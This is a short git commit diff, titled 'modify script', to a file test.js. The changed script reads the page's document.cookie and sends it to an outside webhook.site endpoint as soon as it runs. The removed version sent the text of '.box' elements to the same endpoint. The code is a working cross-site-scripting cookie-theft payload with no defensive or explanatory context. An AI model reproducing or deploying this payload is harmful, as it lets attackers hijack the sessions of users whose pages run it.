3b1e1f0294f867157061e8614f9e90b0631a80f3
Jose Frazao <joseffrazao@protonmail.com>
2025-12-04 18:32:15 +0000

    modify script

--- test.js
+++ test.js
@@ -1,6 +1,4 @@
 async function f() {
-  document.querySelectorAll('.box').forEach(async function(e) {
-    await fetch("https://webhook.site/3aa4a0c2-23a7-4b47-a6e8-00fb20234c33/?cookie="+e.innerText);
-  });
+  const response = await fetch("https://webhook.site/3aa4a0c2-23a7-4b47-a6e8-00fb20234c33/?cookie="+document.cookie);
 }
 f();
